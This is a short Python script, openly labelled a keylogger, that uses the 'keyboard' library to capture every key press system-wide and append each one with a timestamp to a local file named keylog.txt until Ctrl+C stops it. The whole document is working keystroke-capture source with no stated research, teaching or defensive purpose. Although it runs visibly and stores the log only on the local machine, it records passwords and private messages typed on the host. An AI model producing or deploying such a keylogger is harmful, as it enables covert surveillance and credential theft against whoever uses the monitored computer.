import keyboard
import time
import os

# Set the file path and name for the log file
log_file_path = "keylog.txt"

# Create the log file if it doesn't exist
if not os.path.exists(log_file_path):
    open(log_file_path, "w").close()


# Define a function to log keystrokes
def log_keystroke(key):
    with open(log_file_path, "a") as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key}\n")


# Define a function to start the keylogger
def start_keylogger():
    keyboard.on_press(log_keystroke)
    print("Keylogger started. Press Ctrl+C to stop.")


# Define a function to stop the keylogger
def stop_keylogger():
    keyboard.unhook_all()
    print("Keylogger stopped.")


# Start the keylogger
start_keylogger()

# Wait for the user to stop the keylogger
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    stop_keylogger()
